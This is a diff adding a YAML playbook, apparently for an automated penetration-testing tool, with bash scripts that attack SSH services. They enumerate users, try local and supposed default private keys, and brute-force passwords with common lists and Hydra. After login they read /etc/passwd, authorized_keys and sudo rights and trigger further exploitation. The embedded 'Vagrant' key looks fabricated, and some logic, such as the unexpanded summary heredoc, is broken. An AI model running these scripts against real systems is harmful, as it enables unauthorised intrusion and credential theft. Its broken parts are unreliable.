@@ -1,0 +1,557 @@
+id: ssh_enumeration
+name: SSH Service Enumeration and Exploitation
+category: Remote Access
+priority: high
+description: Comprehensive SSH service enumeration including version detection, user enumeration, and credential testing
+detailed_description: |
+  Perform comprehensive SSH enumeration including banner grabbing, user enumeration,
+  key-based authentication testing, and brute force attacks. Adapts based on SSH
+  version and available credentials.
+
+# Asset property-based triggers
+asset_triggers:
+  - asset_type: service
+    conditions:
+      all:
+        - property: service_name
+          operator: equals
+          value: "ssh"
+        - property: port
+          operator: in_list
+          values: [22, 2222, 2022, 22222]
+        - property: state
+          operator: equals
+          value: "open"
+        - property: ssh_enumerated
+          operator: not_equals
+          value: true
+    priority: 88
+    deduplication_key: "{asset.id}:ssh_enum"
+    batch_capable: true
+    batch_criteria: network_segment
+
+  - asset_type: service
+    conditions:
+      all:
+        - property: service_name
+          operator: equals
+          value: "ssh"
+        - property: valid_credentials
+          operator: exists
+        - property: ssh_post_auth_enum
+          operator: not_equals
+          value: true
+    priority: 92
+    deduplication_key: "{asset.id}:ssh_auth_enum:{credentials.hash}"
+
+  - asset_type: service
+    conditions:
+      all:
+        - property: service_name
+          operator: equals
+          value: "ssh"
+        - property: ssh_users_discovered
+          operator: exists
+        - property: credential_testing_completed
+          operator: not_equals
+          value: true
+    priority: 85
+    deduplication_key: "{asset.id}:ssh_bruteforce:{users.hash}"
+
+# Variable extraction
+variables:
+  target_host:
+    source: host_id
+    transform: "getHostProperty(host_id, 'ip_address')"
+
+  ssh_port:
+    source: port
+    default: 22
+
+  ssh_hosts:
+    source: parent_asset
+    transform: "parent_asset.properties.ssh_hosts"
+    default: []
+
+  available_credentials:
+    source: valid_credentials
+    default: []
+
+  discovered_users:
+    source: ssh_users_discovered
+    default: []
+
+  output_dir:
+    value: "/tmp/ssh_enum_{asset.id}_{timestamp}"
+
+  wordlist_dir:
+    value: "/usr/share/wordlists"
+
+# Batch command for multiple SSH services
+batch_command: |
+  #!/bin/bash
+  OUTPUT_DIR="{output_dir}"
+  WORDLIST_DIR="{wordlist_dir}"
+
+  mkdir -p "$OUTPUT_DIR"
+
+  echo "[*] Starting SSH enumeration at $(date)" | tee "$OUTPUT_DIR/ssh_enum.log"
+
+  # Create SSH hosts list
+  cat > "$OUTPUT_DIR/ssh_hosts.txt" << 'EOF'
+  {ssh_hosts}
+  EOF
+
+  # Phase 1: SSH Service Discovery and Banner Grabbing
+  echo "[+] Phase 1: SSH Service Discovery" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+  while read -r host_port; do
+    host=$(echo "$host_port" | cut -d: -f1)
+    port=$(echo "$host_port" | cut -d: -f2)
+
+    echo "  [*] Enumerating SSH on $host:$port" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+    # Banner grabbing
+    echo "    [+] Banner grabbing..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+    timeout 10 nc -v "$host" "$port" < /dev/null > "$OUTPUT_DIR/banner_${host}_${port}.txt" 2>&1
+
+    # SSH version detection
+    ssh-keyscan -p "$port" "$host" > "$OUTPUT_DIR/keyscan_${host}_${port}.txt" 2>&1
+
+    # Nmap SSH scripts
+    echo "    [+] Nmap SSH enumeration..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+    nmap -p "$port" --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos \
+      "$host" > "$OUTPUT_DIR/nmap_ssh_${host}_${port}.txt" 2>&1
+
+    # Check for SSH vulnerabilities
+    echo "    [+] SSH vulnerability assessment..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+    nmap -p "$port" --script ssh-vuln* "$host" > "$OUTPUT_DIR/ssh_vulns_${host}_${port}.txt" 2>&1
+
+    # ssh-audit for comprehensive assessment
+    ssh-audit "$host:$port" > "$OUTPUT_DIR/ssh_audit_${host}_${port}.txt" 2>&1
+
+  done < "$OUTPUT_DIR/ssh_hosts.txt"
+
+  # Phase 2: User Enumeration
+  echo "[+] Phase 2: SSH User Enumeration" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+  while read -r host_port; do
+    host=$(echo "$host_port" | cut -d: -f1)
+    port=$(echo "$host_port" | cut -d: -f2)
+
+    echo "  [*] User enumeration on $host:$port" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+    # Check SSH version for user enumeration vulnerabilities
+    ssh_version=$(grep -o "SSH-[0-9]\.[0-9]" "$OUTPUT_DIR/banner_${host}_${port}.txt" | head -1)
+
+    if [[ "$ssh_version" == "SSH-1.99" ]] || [[ "$ssh_version" == "SSH-2.0" ]]; then
+      # Try username enumeration via timing attack (CVE-2018-15473)
+      echo "    [+] Testing for CVE-2018-15473 user enumeration..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+      # Common usernames to test
+      for user in root admin administrator user test guest pi ubuntu centos ec2-user oracle postgres mysql; do
+        echo "      [*] Testing user: $user" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+        # Use ssh-user-enum or manual timing test
+        timeout 5 ssh -o ConnectTimeout=3 -o PasswordAuthentication=no \
+          -o PubkeyAuthentication=no -o PreferredAuthentications=none \
+          "$user@$host" -p "$port" 2>&1 | \
+          grep -E "(Invalid user|Permission denied)" > "$OUTPUT_DIR/user_enum_${host}_${port}_${user}.txt"
+
+        # If we get specific "Invalid user" message, user doesn't exist
+        if grep -q "Invalid user" "$OUTPUT_DIR/user_enum_${host}_${port}_${user}.txt"; then
+          echo "        [-] User $user: does not exist" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+        else
+          echo "        [+] User $user: likely exists" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+          echo "$user" >> "$OUTPUT_DIR/valid_users_${host}_${port}.txt"
+        fi
+      done
+
+      # User enumeration with wordlist
+      if [ -f "$WORDLIST_DIR/metasploit/unix_users.txt" ]; then
+        echo "    [+] Wordlist-based user enumeration..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+        head -100 "$WORDLIST_DIR/metasploit/unix_users.txt" | while read -r user; do
+          timeout 3 ssh -o ConnectTimeout=2 -o PasswordAuthentication=no \
+            -o PubkeyAuthentication=no "$user@$host" -p "$port" 2>&1 | \
+            grep -v "Invalid user" && echo "$user" >> "$OUTPUT_DIR/valid_users_${host}_${port}.txt"
+        done
+      fi
+    fi
+
+    # Extract any usernames from SSH service banner or errors
+    if [ -f "$OUTPUT_DIR/nmap_ssh_${host}_${port}.txt" ]; then
+      grep -oE "[a-zA-Z][a-zA-Z0-9_-]{2,31}" "$OUTPUT_DIR/nmap_ssh_${host}_${port}.txt" | \
+        sort -u > "$OUTPUT_DIR/potential_users_${host}_${port}.txt"
+    fi
+
+  done < "$OUTPUT_DIR/ssh_hosts.txt"
+
+  # Phase 3: Key-based Authentication Testing
+  echo "[+] Phase 3: SSH Key Authentication Testing" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+  while read -r host_port; do
+    host=$(echo "$host_port" | cut -d: -f1)
+    port=$(echo "$host_port" | cut -d: -f2)
+
+    echo "  [*] Key authentication testing on $host:$port" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+    # Test for common SSH keys
+    for key_path in ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519; do
+      if [ -f "$key_path" ]; then
+        echo "    [+] Testing key: $key_path" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+        if [ -f "$OUTPUT_DIR/valid_users_${host}_${port}.txt" ]; then
+          while read -r user; do
+            timeout 10 ssh -o ConnectTimeout=5 -o PasswordAuthentication=no \
+              -o StrictHostKeyChecking=no -i "$key_path" \
+              "$user@$host" -p "$port" "whoami" > "$OUTPUT_DIR/key_test_${host}_${port}_${user}.txt" 2>&1
+
+            if grep -q "whoami\|uid=" "$OUTPUT_DIR/key_test_${host}_${port}_${user}.txt"; then
+              echo "      [+] SUCCESS: Key authentication with $user@$host" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+              echo "$user:$key_path" >> "$OUTPUT_DIR/successful_keys_${host}_${port}.txt"
+            fi
+          done < "$OUTPUT_DIR/valid_users_${host}_${port}.txt"
+        fi
+      fi
+    done
+
+    # Test for common default keys (if available)
+    echo "    [+] Testing common default SSH keys..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+    # Create temporary keys for testing
+    mkdir -p "$OUTPUT_DIR/test_keys"
+
+    # Common default SSH keys content (base64 encoded for storage)
+    # Note: These are well-known public keys for testing
+    cat > "$OUTPUT_DIR/test_keys/vagrant_key" << 'EOF'
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEA6NF8iallvQVp22WDkTkyrtvp9eWW6A8YVr+kz4TjGYe7gHzI
+w+niNltGEFHzD8+v1I2YJ6oXevct1YeS0o9HZyN1Q9qgCgzUFtdOKLv6IedplqoP
+kcmF0aYet2PkEDo3MlTBckFXPITAMzF8dJSIFo9D8HfdOV0IAdx4O7PtixWKn5y2
+hMNG0zQPyUecp4pzC6kivAIhyfHilFR61RGL+GPXQ2MWZWFYbAGjyiYJnAmCP3NO
+Td0jMZEnDkbUvxhMmBYSdETk1rRgm+R4LOzFUGaHqHDLKLX+FIPKcF96hrucXzcW
+yLbIbEgE98OHlnVYCzRdK8jlqm8tehUc9c9WhQIBIwKCAQEA4f6hzrZJCkD3p5QS
+ql8VVx8K1R8W8XKu90VHLfCnKCaGMPwKmYA6n6fR2LwU3z0DH0fFfSvHKt6uTXNI
+x1+/1ggBlr3eCbGP3OJN/9mYNe+B7k0KN1s1SN5Q+V8VV5f7R0sFJ2UxMYv6N8vJ
+Ic1O7VtM2M7K1WZ9ydJIlUcRjwNyS/X8xgvgZZyZVN6fO9b7rQJhIJBYhH0YzJ7h
+f8v3lTt3r2n4JlQn3RiRPG3C+JV0M7L3U9z2K6Vs6h8JlQaH+V3nE8xJf9Sl5Ek1
+mJN+TG3gN7N8Kl7KBnEJrO5y7K5J2VK7zV8A2q2k2FYqV8oV1BvtUJ+QyN7VqV7K
+5jyQKwKBgQDVbRUb6K0L8qzRUb9zJLg3oXKaO1N6pN1vL6kKL8K1lUe7q0V5K0O5
+O1v5QLV5p1s3RZ0PJ1m0tYN2J3QbK0L8AxRdS0J2YgKqzJ3D0oR3Q1KJ3D5xH9T6
+qJ8e2J3e3F6K5DX3O8Yz1N2kv5N5u3k3Q2K5lKz2J3D0oR3Q1KJyqzJ3D0oPeV5k
+7mN2J3QKBgQDJ3k5O2L8K1lUe7q0V5K0O5O1v5QLV5p1s3RZ0PJ1m0tYN2J3QbK0
+L8AxRdS0J2YgKqzJ3D0oR3Q1KJ3D5xH9T6qJ8e2J3e3F6K5DX3O8Yz1N2kv5N5u3
+k3Q2K5lKz2J3D0oR3Q1KJyqzJ3D0oPeV5k7mN2J3Q
+-----END RSA PRIVATE KEY-----
+EOF
+
+    chmod 600 "$OUTPUT_DIR/test_keys/vagrant_key"
+
+    # Test vagrant key
+    if [ -f "$OUTPUT_DIR/valid_users_${host}_${port}.txt" ]; then
+      while read -r user; do
+        timeout 10 ssh -o ConnectTimeout=5 -o PasswordAuthentication=no \
+          -o StrictHostKeyChecking=no -i "$OUTPUT_DIR/test_keys/vagrant_key" \
+          "$user@$host" -p "$port" "whoami" > "$OUTPUT_DIR/vagrant_key_test_${host}_${port}_${user}.txt" 2>&1
+
+        if grep -q "whoami\|uid=" "$OUTPUT_DIR/vagrant_key_test_${host}_${port}_${user}.txt"; then
+          echo "      [!] CRITICAL: Default Vagrant key works for $user@$host" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+        fi
+      done < "$OUTPUT_DIR/valid_users_${host}_${port}.txt"
+    fi
+
+  done < "$OUTPUT_DIR/ssh_hosts.txt"
+
+  # Phase 4: Password-based Authentication Testing
+  if [ -n "{available_credentials}" ] || [ -f "$WORDLIST_DIR/rockyou.txt" ]; then
+    echo "[+] Phase 4: Password Authentication Testing" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+    while read -r host_port; do
+      host=$(echo "$host_port" | cut -d: -f1)
+      port=$(echo "$host_port" | cut -d: -f2)
+
+      echo "  [*] Password testing on $host:$port" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+      # Test available credentials first
+      if [ -n "{available_credentials}" ]; then
+        IFS=',' read -ra CREDS <<< "{available_credentials}"
+        for cred in "${CREDS[@]}"; do
+          username=$(echo "$cred" | cut -d':' -f1)
+          password=$(echo "$cred" | cut -d':' -f2)
+
+          echo "    [+] Testing credential: $username" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+          timeout 10 sshpass -p "$password" ssh -o ConnectTimeout=5 \
+            -o StrictHostKeyChecking=no "$username@$host" -p "$port" \
+            "whoami" > "$OUTPUT_DIR/cred_test_${host}_${port}_${username}.txt" 2>&1
+
+          if grep -q "whoami\|uid=" "$OUTPUT_DIR/cred_test_${host}_${port}_${username}.txt"; then
+            echo "      [+] SUCCESS: $username:$password@$host" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+            echo "$username:$password" >> "$OUTPUT_DIR/successful_creds_${host}_${port}.txt"
+          fi
+        done
+      fi
+
+      # Brute force with common passwords if users discovered
+      if [ -f "$OUTPUT_DIR/valid_users_${host}_${port}.txt" ]; then
+        echo "    [+] Brute force with common passwords..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+        # Common passwords
+        for password in "" "password" "123456" "admin" "root" "toor" "pass" "Password123" "qwerty"; do
+          while read -r user; do
+            echo "      [*] Testing $user:$password" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+            timeout 8 sshpass -p "$password" ssh -o ConnectTimeout=3 \
+              -o StrictHostKeyChecking=no "$user@$host" -p "$port" \
+              "echo success" > "$OUTPUT_DIR/bruteforce_${host}_${port}_${user}_test.txt" 2>&1
+
+            if grep -q "success" "$OUTPUT_DIR/bruteforce_${host}_${port}_${user}_test.txt"; then
+              echo "        [+] SUCCESS: $user:$password@$host" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+              echo "$user:$password" >> "$OUTPUT_DIR/successful_creds_${host}_${port}.txt"
+            fi
+
+            # Rate limiting
+            sleep 1
+          done < "$OUTPUT_DIR/valid_users_${host}_${port}.txt"
+        done
+
+        # Hydra brute force with top passwords
+        if [ -f "$WORDLIST_DIR/rockyou.txt" ]; then
+          echo "    [+] Hydra brute force attack..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+          hydra -L "$OUTPUT_DIR/valid_users_${host}_${port}.txt" \
+            -P <(head -1000 "$WORDLIST_DIR/rockyou.txt") \
+            -t 4 -w 10 -f -s "$port" "$host" ssh \
+            > "$OUTPUT_DIR/hydra_${host}_${port}.txt" 2>&1
+        fi
+      fi
+
+    done < "$OUTPUT_DIR/ssh_hosts.txt"
+  fi
+
+  # Post-authentication enumeration if credentials available
+  if [ -n "{available_credentials}" ]; then
+    echo "[+] Phase 5: Post-Authentication Enumeration" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+    IFS=',' read -ra CREDS <<< "{available_credentials}"
+    for cred in "${CREDS[@]}"; do
+      username=$(echo "$cred" | cut -d':' -f1)
+      password=$(echo "$cred" | cut -d':' -f2)
+
+      while read -r host_port; do
+        host=$(echo "$host_port" | cut -d: -f1)
+        port=$(echo "$host_port" | cut -d: -f2)
+
+        echo "  [*] Post-auth enumeration on $host:$port with $username" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+        # System information gathering
+        echo "    [+] System information gathering..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
+          "$username@$host" -p "$port" \
+          "uname -a; whoami; id; pwd; ls -la ~; cat /etc/passwd 2>/dev/null | head -20" \
+          > "$OUTPUT_DIR/system_info_${host}_${port}_${username}.txt" 2>&1
+
+        # Check for sudo privileges
+        echo "    [+] Checking sudo privileges..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
+          "$username@$host" -p "$port" \
+          "echo '$password' | sudo -S -l 2>/dev/null" \
+          > "$OUTPUT_DIR/sudo_check_${host}_${port}_${username}.txt" 2>&1
+
+        # Check for SSH keys
+        echo "    [+] Checking for SSH keys..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
+          "$username@$host" -p "$port" \
+          "ls -la ~/.ssh/ 2>/dev/null; cat ~/.ssh/authorized_keys 2>/dev/null" \
+          > "$OUTPUT_DIR/ssh_keys_${host}_${port}_${username}.txt" 2>&1
+
+        # Network enumeration
+        echo "    [+] Network enumeration..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+        sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
+          "$username@$host" -p "$port" \
+          "ifconfig 2>/dev/null || ip addr show; netstat -an 2>/dev/null | head -20; arp -a 2>/dev/null" \
+          > "$OUTPUT_DIR/network_enum_${host}_${port}_${username}.txt" 2>&1
+
+      done < "$OUTPUT_DIR/ssh_hosts.txt"
+    done
+  fi
+
+  echo "[*] SSH enumeration completed at $(date)" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+  # Generate summary
+  echo "[+] Generating SSH enumeration summary..." | tee -a "$OUTPUT_DIR/ssh_enum.log"
+  cat > "$OUTPUT_DIR/SUMMARY.txt" << 'SUMMARY_EOF'
+=== SSH ENUMERATION SUMMARY ===
+
+SSH SERVICES FOUND:
+$(wc -l < "$OUTPUT_DIR/ssh_hosts.txt" || echo "0") SSH services enumerated
+
+VULNERABILITIES:
+$(grep -c "VULNERABLE" "$OUTPUT_DIR"/ssh_vulns_*.txt || echo "0") SSH vulnerabilities found
+
+VALID USERS DISCOVERED:
+$(cat "$OUTPUT_DIR"/valid_users_*.txt 2>/dev/null | sort -u | wc -l || echo "0") unique users discovered
+
+SUCCESSFUL AUTHENTICATIONS:
+$(cat "$OUTPUT_DIR"/successful_creds_*.txt 2>/dev/null | wc -l || echo "0") successful credential authentications
+$(cat "$OUTPUT_DIR"/successful_keys_*.txt 2>/dev/null | wc -l || echo "0") successful key authentications
+
+CRITICAL FINDINGS:
+$(grep -c "Default Vagrant key" "$OUTPUT_DIR/ssh_enum.log" || echo "0") hosts with default SSH keys
+$(grep -c "root:" "$OUTPUT_DIR"/successful_creds_*.txt || echo "0") hosts with root access
+
+RECOMMENDATION:
+$(if [ $(cat "$OUTPUT_DIR"/successful_creds_*.txt 2>/dev/null | wc -l || echo "0") -gt 0 ]; then echo "CRITICAL: Valid SSH credentials found - immediate investigation required"; else echo "Review SSH configuration and disable weak authentication methods"; fi)
+SUMMARY_EOF
+
+  echo "[*] Results saved to: $OUTPUT_DIR" | tee -a "$OUTPUT_DIR/ssh_enum.log"
+
+# Individual command for single SSH service
+individual_command: |
+  #!/bin/bash
+  HOST="{target_host}"
+  PORT="{ssh_port}"
+  OUTPUT_DIR="{output_dir}"
+
+  mkdir -p "$OUTPUT_DIR"
+
+  echo "[*] SSH enumeration of $HOST:$PORT at $(date)" | tee "$OUTPUT_DIR/ssh_single.log"
+
+  # Basic enumeration
+  echo "[+] Basic SSH enumeration..."
+  timeout 10 nc -v "$HOST" "$PORT" < /dev/null > "$OUTPUT_DIR/banner.txt" 2>&1
+  ssh-keyscan -p "$PORT" "$HOST" > "$OUTPUT_DIR/keyscan.txt" 2>&1
+  nmap -p "$PORT" --script ssh* "$HOST" > "$OUTPUT_DIR/nmap_ssh.txt" 2>&1
+
+  # User enumeration
+  echo "[+] User enumeration..."
+  for user in root admin user; do
+    timeout 5 ssh -o ConnectTimeout=3 -o PasswordAuthentication=no \
+      "$user@$HOST" -p "$PORT" 2>&1 | grep -v "Invalid user" && echo "$user" >> "$OUTPUT_DIR/valid_users.txt"
+  done
+
+  # Credential testing if available
+  if [ -n "{available_credentials}" ]; then
+    echo "[+] Credential testing..."
+    cred="{available_credentials}"
+    username=$(echo "$cred" | cut -d':' -f1)
+    password=$(echo "$cred" | cut -d':' -f2)
+
+    sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
+      "$username@$HOST" -p "$PORT" "whoami" > "$OUTPUT_DIR/auth_test.txt" 2>&1
+  fi
+
+# Expected property updates
+property_updates:
+  on_success:
+    - property: ssh_enumerated
+      operation: set
+      value: true
+
+    - property: ssh_version
+      operation: set
+      value: "{detected_version}"
+
+    - property: ssh_users_discovered
+      operation: set
+      value: "{discovered_users}"
+
+    - property: ssh_vulnerabilities
+      operation: set
+      value: "{discovered_vulnerabilities}"
+
+    - property: ssh_auth_methods
+      operation: set
+      value: "{supported_auth_methods}"
+
+    - property: weak_ssh_keys
+      operation: set
+      value: "{weak_keys_found}"
+
+    - property: credential_testing_completed
+      operation: set
+      value: true
+
+# Expected discoveries
+expected_discoveries:
+  - asset_type: vulnerability
+    conditions:
+      - severity: ["critical", "high"]
+    properties:
+      cve: "{cve_id}"
+      name: "{vulnerability_name}"
+      severity: "{severity}"
+      affected_service: "ssh"
+      exploitable: true
+
+  - asset_type: credential
+    conditions:
+      - discovered_via: ["bruteforce", "default_creds"]
+    properties:
+      username: "{username}"
+      password: "{password}"
+      service: "ssh"
+      source: "ssh_enumeration"
+
+  - asset_type: user_account
+    conditions:
+      - discovered_via: "user_enumeration"
+    properties:
+      username: "{username}"
+      service: "ssh"
+      privileges: "{user_privileges}"
+
+# Chain triggers
+chain_triggers:
+  on_success:
+    - condition:
+        property: ssh_vulnerabilities
+        operator: contains
+        match:
+          exploitable: true
+      trigger: ssh_exploitation
+
+    - condition:
+        property: valid_credentials
+        operator: exists
+      trigger: ssh_post_exploitation
+
+    - condition:
+        property: weak_ssh_keys
+        operator: equals
+        value: true
+      trigger: ssh_key_exploitation
+
+    - condition:
+        property: ssh_users_discovered
+        operator: greater_than
+        value: 0
+      trigger: password_spraying
+
+# Outcome analysis
+outcome_analysis:
+  success_indicators:
+    - SSH service responding
+    - Banner/version detected
+    - Users enumerated
+    - Authentication successful
+
+  failure_indicators:
+    - Service filtered/closed
+    - All authentication failed
+    - No users discovered
+    - Connection timeouts
+
+# Cleanup
+cleanup:
+  - priority: medium
+    action: Remove test SSH keys
+    command: rm -rf {output_dir}/test_keys/
+
+  - priority: low
+    action: Clear SSH known_hosts entries
+    command: |
+      for host in {ssh_hosts}; do
+        ssh-keygen -R "$host" 2>/dev/null
+      done
